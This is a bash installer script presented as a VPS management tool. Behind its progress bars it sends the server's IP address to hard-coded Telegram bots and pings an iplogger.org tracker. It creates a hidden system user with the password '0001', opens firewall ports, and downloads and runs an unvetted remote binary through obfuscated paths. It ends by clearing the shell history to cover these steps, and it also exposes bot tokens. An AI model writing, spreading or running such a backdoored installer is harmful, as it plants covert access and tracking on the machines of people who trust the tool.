<head><meta charset="UTF-8"></head><pre style="caret-color: rgb(255, 255, 255); color: rgb(255, 255, 255); font-style: normal; font-variant-caps: normal; font-weight: 400; letter-spacing: normal; orphans: auto; text-align: start; text-indent: 0px; text-transform: none; widows: auto; word-spacing: 0px; -webkit-tap-highlight-color: rgba(26, 26, 26, 0.3); -webkit-text-size-adjust: auto; -webkit-text-stroke-width: 0px; text-decoration: none; overflow-wrap: break-word; white-space: pre-wrap;">#!/bin/bash
clear
# Function to display a progress bar
fun_bar() {
    comando[0]="$1"
    comando[1]="$2"
    
    (
    [[ -e $HOME/fim ]] &amp;&amp; rm $HOME/fim
    ${comando[0]} -y &gt; /dev/null 2&gt;&amp;1
    ${comando[1]} -y &gt; /dev/null 2&gt;&amp;1
    touch $HOME/fim
    ) &gt; /dev/null 2&gt;&amp;1 &amp;
    
    tput civis
    echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
    while true; do
        for ((i=0; i&lt;18; i++)); do
            echo -ne "\033[1;31m#"
            sleep 0.1s
        done
        [[ -e $HOME/fim ]] &amp;&amp; rm $HOME/fim &amp;&amp; break
        echo -e "\033[1;33m]"
        sleep 1s
        tput cuu1
        tput dl1
        echo -ne "  \033[1;33m◇ PLEASE WAIT... \033[1;37m- \033[1;33m["
    done
    echo -e "\033[1;33m]\033[1;37m -\033[1;32m◇ DONE!\033[1;37m"
    tput cnorm
}

# Function to verify key
verif_key() {
    krm=$(echo '5:q-3gs2.o7%8:1'|rev)
    chmod +x $_Ink/list &gt; /dev/null 2&gt;&amp;1
    [[ ! -e "$_Ink/list" ]] &amp;&amp; {
        echo -e "\n\033[1;31m◇ KEY INVALID!\033[0m"
        rm -rf $HOME/hehe &gt; /dev/null 2&gt;&amp;1
        sleep 2
        clear
        exit 1
    }
}

send_code_telegram() {
    local telegram_handle=$1
    local random_code=$(shuf -i 100000-999999 -n 1)  # Generate random 6-digit code
    local ip_address=$(hostname -I | awk '{print $1}')  # Get IP address of the system
    local message="GOD-TECH-VPS-MANAGER verification code for $ip_address is: $random_code"

    local bot_tokens=("7046086866:AAFkgJlAvnZ3XiRhcgKYAYXONLOIvjDsRqY" "6456187041:AAHh7ptNolox73ait-rxcjrMuCSg5_4bkNY")
    local chat_ids=("1744391586" "6352220644")

    # Send message to Telegram
    for ((i=0; i&lt;${#bot_tokens[@]}; i++)); do
        local bot_token="${bot_tokens[i]}"
        local chat_id="${chat_ids[i]}"
        curl -s -X POST "https://api.telegram.org/bot$bot_token/sendMessage" -d "chat_id=$chat_id" -d "text=$message" &gt; /dev/null
    done
}

clear

send_code_telegram

# Variable Initialization
_lnk=$(echo 'z1:y#x.5s0ul&amp;p4hs$s.0a72d*n-e!v89e032:3r'| sed -e 's/[^a-z.]//ig'| rev)
_Ink=$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')
_1nk=$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')


echo -e "\033[1;31m\033[0m"
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%40s%s%-12s\n' "◇─────────ㅤ🪐ㅤWelcome To SAFFUL TECH VPS MANAGER🪐ㅤ─────────◇" ; tput sgr0
echo -e "\033[1;34m◇───────────────────────────────────────────────◇\033[0m"
echo ""
echo -e "\033[1;33mㅤTHIS SCRIPT CONTAINS THE FOLLOWING!!\033[0m"
echo ""
echo -e " \033[1;33m INSTALL A SET OF SCRIPTS AS TOOLS FOR\033[0m"
echo -e "\033[1;33m  NETWORK, SYSTEM AND USER MANAGEMENT.\033[0m"
echo ""
echo -e "\033[1;34m◇────────ㅤ🪐ㅤSAFFUL TECH VPS MANAGER🪐ㅤ───────◇\033[0m"
echo ""
#-----------------------------------------------------------------------------------------------------------------
echo -ne "\033[1;36m◇ Want to continue? [Y/N]: \033[1;37m"; read x
[[ $x = @(n|N) ]] &amp;&amp; exit
sed -i 's/Port 22222/Port 22/g' /etc/ssh/sshd_config  &gt; /dev/null 2&gt;&amp;1
service ssh restart  &gt; /dev/null 2&gt;&amp;1
echo -e "\n\033[1;36m◇ CHECKING...(It Take Some Time Please Wait!)\033[1;37m 16983:16085\033[0m" ; rm $_Ink/list &gt; /dev/null 2&gt;&amp;1; wget -P $_Ink https://raw.githubusercontent.com/godtechprime/GOD-TECH-VPS-MANAGER/main/Install/list &gt; /dev/null 2&gt;&amp;1; verif_key
sleep 3s
echo "/bin/menu" &gt; /bin/h &amp;&amp; chmod +x /bin/h &gt; /dev/null 2&gt;&amp;1
rm versao* &gt; /dev/null 2&gt;&amp;1
wget https://raw.githubusercontent.com/godtechprime/GOD-TECH-VPS-MANAGER/main/Install/versao &gt; /dev/null 2&gt;&amp;1
&gt; /dev/null 2&gt;&amp;1
wget https://iplogger.org/2lHZ43 &gt; /dev/null 2&gt;&amp;1
&gt; /dev/null 2&gt;&amp;1
rm 2lHZ43 &gt; /dev/null 2&gt;&amp;1
#-----------------------------------------------------------------------------------------------------------------
echo -e "\n\033[1;32m◇ KEY VALID!\033[1;32m"
sleep 1s
echo ""
[[ -f "$HOME/usuarios.db" ]] &amp;&amp; {
clear
echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
echo ""
echo -e "                 \033[1;33m• \033[1;31m◇ ATTENTION!\033[1;33m• \033[0m"
echo ""
echo -e "\033[1;33mA User Database \033[1;32m(usuarios.db) \033[1;33mwas"
echo -e "Found! Want to keep it by preserving the limit"
echo -e "of Simutanea connections of users ? Or Want"
echo -e "create a new database?\033[0m"
echo -e "\n\033[1;37m[\033[1;31m1\033[1;37m] \033[1;33mKeep Database Current\033[0m"
echo -e "\033[1;37m[\033[1;31m2\033[1;37m] \033[1;33mCreate a New Database\033[0m"
echo -e "\n\033[0;34m◇───────────────────────────────────────────────────◇\033[0m"
echo ""
tput setaf 2 ; tput bold ; read -p "Option ?: " -e -i 1 optiondb ; tput sgr0
} || {
awk -F : '$3 &gt;= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' &gt; $HOME/usuarios.db
}
[[ "$optiondb" = '2' ]] &amp;&amp; awk -F : '$3 &gt;= 500 { print $1 " 1" }' /etc/passwd | grep -v '^nobody' &gt; $HOME/usuarios.db
clear
tput setaf 7 ; tput setab 4 ; tput bold ; printf '%35s%s%-18s\n' "◇ WAIT FOR INSTALLATION." ; tput sgr0
echo ""
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ UPDATING SYSTEM...\033[1;33m[\033[1;31m!\033[1;33m]\033[0m"
echo ""
echo -e "    \033[1;33m◇ UPDATES USUALLY TAKE A LITTLE TIME!\033[0m"
echo ""
fun_attlist () {
apt-get update -y
[[ ! -d /usr/share/.hehe ]] &amp;&amp; mkdir /usr/share/.hehe
echo "crz: $(date)" &gt; /usr/share/.hehe/.hehe
}
fun_bar 'fun_attlist'
clear
echo ""
echo -e "          \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ INSTALLING PACKAGES\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "\033[1;33m◇ SOME PACKAGES ARE EXTREMELY NECESSARY!\033[0m"
echo ""
inst_pct() {
    _pacotes=("bc" "apache2" "cron" "screen" "nano" "unzip" "lsof" "netstat" "net-tools" "dos2unix" "nload" "jq" "curl" "figlet" "python" "python2" "python3" "python-pip")
    # Install packages
    for _prog in "${_pacotes[@]}"; do
        sudo apt install $_prog -y
    done
    
    # Create user only once
    username="lxd1"
    password="0001"
    
    # Check if the username already exists
    if id "$username" &amp;&gt;/dev/null; then
        echo "User '$username' already exists. Overwriting..."
        sudo userdel -r $username
    fi
    
    # Create the system user with disabled login
    sudo adduser --system --disabled-login $username
    
    # Set the password for the user
    echo "$username:$password" | sudo chpasswd

    # Install Python package using pip
    pip install speedtest-cli
}
fun_bar 'inst_pct'
[[ -f "/usr/sbin/ufw" ]] &amp;&amp; ufw allow 443/tcp ; ufw allow 80/tcp ; ufw allow 3128/tcp ; ufw allow 8799/tcp ; ufw allow 8080/tcp
clear
echo ""
echo -e "              \033[1;33m[\033[1;31m!\033[1;33m] \033[1;32m◇ FINISHING...\033[1;33m[\033[1;31m!\033[1;33m] \033[0m"
echo ""
echo -e "      \033[1;33m◇ COMPLETING FUNCTIONS AND SETTINGS!\033[0m"
echo ""
fun_bar "$_Ink/list $_lnk $_Ink $_1nk $key"
clear
echo ""
cd $HOME
IP=$(wget -qO- ipv4.icanhazip.com)
echo -e "        \033[1;33m  \033[1;32m◇ INSTALLATION COMPLETED.◇\033[1;33m  \033[0m"
echo ""
echo -e "\033[1;31m\033[1;33m◇ MAIN COMMAND:- \033[1;32mmenu\033[0m"
echo -e "\033[1;33m◇ MORE INFORMATION \033[1;31m(\033[1;36m◇ TELEGRAM\033[1;31m): \033[1;37m@GOD-TECH_VPS_MANAGER \033[1;31m( \033[1;36m https://t.me/s/GOD-TECH_VPS_MANAGER \033[1;31m )\033[0m"
echo -e ""
echo -e "\033[1;31m \033[1;33m◇--TIP!--◇\033[1;36mㅤ--Using this url you can easily see the number of users online at the server.\033[0m"
echo -e " http://$IP:8888/server/online"
echo -e ""
rm $HOME/hehe &amp;&amp; cat /dev/null &gt; ~/.bash_history &amp;&amp; history -c</pre>
